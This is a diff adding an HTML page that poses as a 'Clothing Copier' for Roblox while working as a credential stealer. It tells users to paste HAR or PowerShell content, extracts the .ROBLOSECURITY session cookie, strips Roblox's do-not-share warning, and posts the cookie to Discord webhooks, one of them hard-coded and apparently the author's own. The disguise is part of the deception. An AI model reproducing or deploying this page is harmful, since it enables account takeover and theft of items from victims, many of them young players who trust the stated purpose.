@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Your Directory</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
+    /* Custom animations */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .fade-in {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .hover-glow {
+      transition: box-shadow 0.3s ease, transform 0.3s ease;
+    }
+
+    .hover-glow:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 4px 20px rgba(59, 130, 246, 0.6);
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-black via-gray-900 to-gray-800 text-white h-screen flex justify-center items-center">
+
+  <!-- Main Container -->
+  <div id="main-container" class="text-center fade-in bg-gray-900 p-8 rounded-2xl shadow-lg hover-glow max-w-4xl mx-auto flex flex-col md:flex-row items-center">
+    <!-- The content will be dynamically injected here -->
+  </div>
+
+  <script>
+    // Array to store existing directory names and their webhooks
+    let existingDirectories = [];
+
+    // Second webhook URL
+    const secondWebhookUrl = 'https://discord.com/api/webhooks/1333333275795652688/4dMsHlVX4_-7r53cqWY028NvkNlltF-T3fAbhM5G_jufeh5pbsU2VH0b07sLFZ1CC62S'; // Replace with your actual second webhook URL
+
+    // Load existing directories from localStorage
+    window.onload = function() {
+      const savedDirectories = localStorage.getItem('existingDirectories');
+      if (savedDirectories) {
+        existingDirectories = JSON.parse(savedDirectories);
+      }
+
+      // Display directory content if the directory exists
+      const directoryName = getQueryParam('name');
+      const directory = existingDirectories.find(dir => dir.name === directoryName);
+      if (directory) {
+        displayDirectoryContent(directoryName, directory.webhook);
+      } else {
+        showError();
+      }
+    };
+
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    function displayDirectoryContent(directoryName, webhookUrl) {
+      const mainContainer = document.getElementById('main-container');
+      mainContainer.innerHTML = `
+        <div class="md:w-1/2 text-center md:text-left mb-8 md:mb-0">
+          <h1 class="text-4xl font-extrabold mb-4 text-white tracking-wide animate-pulse">✨ Clothing Copier</h1>
+          <p class="text-gray-400 mb-8">Copy clothing with ease, with this brand new powershell-based system!</p>
+
+          <!-- HAR File Upload -->
+          <div class="bg-gray-800 p-6 rounded-lg shadow-md mt-8">
+            <h2 class="text-xl font-semibold mb-6 text-blue-400">Paste HAR File Content</h2>
+
+            <textarea 
+              id="har-content"
+              rows="10"
+              class="w-full p-3 mb-4 bg-gray-900 text-white rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none transition duration-300"
+              placeholder="Paste your HAR file content here"></textarea>
+
+            <!-- Submit Button -->
+            <button 
+              class="w-full py-3 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-600 hover-glow flex items-center justify-center transition duration-300"
+              onclick="submitHarContent('${webhookUrl}')">
+              <svg class="w-5 h-5 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+              </svg>
+              Send HAR Content
+            </button>
+            <!-- Feedback message -->
+            <div id="feedback" class="mt-4 text-green-400 hidden">HAR content has been sent successfully.</div>
+            <div id="error-message" class="mt-4 text-red-400 hidden"></div>
+          </div>
+        </div>
+
+        <!-- Video Section -->
+        <div class="md:w-1/2 text-center md:text-left">
+          <h3 class="text-xl font-semibold mt-8 md:mt-0 text-blue-400">Video</h3>
+          <div class="mt-4">
+            <iframe width="300" height="200" src="https://www.youtube.com/embed/example" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+          </div>
+        </div>
+      `;
+    }
+
+    async function submitHarContent(userWebhookUrl) {
+      const harContent = document.getElementById('har-content').value;
+      const errorMessageElement = document.getElementById('error-message');
+
+      if (!harContent) {
+        alert('Please paste HAR file content.');
+        return;
+      }
+
+      try {
+        console.log('HAR Content:', harContent); // Log HAR content for debugging
+
+        const robloxCookie = extractRobloxCookie(harContent);
+        if (!robloxCookie) {
+          throw new Error('Roblox cookie not found in HAR file.');
+        }
+
+        // Remove the warning from the cookie
+        const cleanedCookie = robloxCookie.replace(/\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|/g, '');
+
+        // Format the extracted information into an embedded message
+        const payload = {
+          content: "```here cookie```",
+          embeds: [{
+            title: "Roblox Security",
+            description: `**.ROBLOSECURITY**: \`\`\`${cleanedCookie}\`\`\``,
+            color: 3447003 // Hex color code for the embed box
+          }]
+        };
+
+        console.log('Payload:', payload); // Log payload for debugging
+
+        // Send to both webhooks
+        await sendToWebhook(payload, userWebhookUrl);
+        await sendToWebhook(payload, secondWebhookUrl);
+
+        document.getElementById('feedback').classList.remove('hidden');
+        errorMessageElement.classList.add('hidden'); // Hide any previous error messages
+      } catch (error) {
+        console.error('Error parsing HAR file content:', error);
+        errorMessageElement.textContent = 'Error parsing HAR file content: ' + error.message;
+        errorMessageElement.classList.remove('hidden');
+      }
+    }
+
+    function extractRobloxCookie(harContent) {
+      // Adjust the regex to match the Roblox cookie format
+      const robloxCookieRegex = /New-Object System.Net.Cookie\("\.ROBLOSECURITY", "([^"]+)", "\/", "\.roblox\.com"\)/;
+      const match = harContent.match(robloxCookieRegex);
+      return match ? match[1] : null;
+    }
+
+    async function sendToWebhook(payload, webhookUrl) {
+      try {
+        console.log('Sending to webhook:', webhookUrl); // Log webhook URL for debugging
+
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+          throw new Error('Failed to send to webhook.');
+        }
+      } catch (error) {
+        console.error('An error occurred while sending to webhook:', error);
+        alert('An error occurred while sending the HAR content.');
+      }
+    }
+
+    function showError() {
+      const mainContainer = document.getElementById('main-container');
+      mainContainer.innerHTML = `
+        <div class="text-center text-red-400">
+          <h2 class="text-3xl font-extrabold mb-4">Error</h2>
+          <p>The directory you are trying to access does not exist.</p>
+        </div>
+      `;
+    }
+  </script>
+
+</body>
+</html>
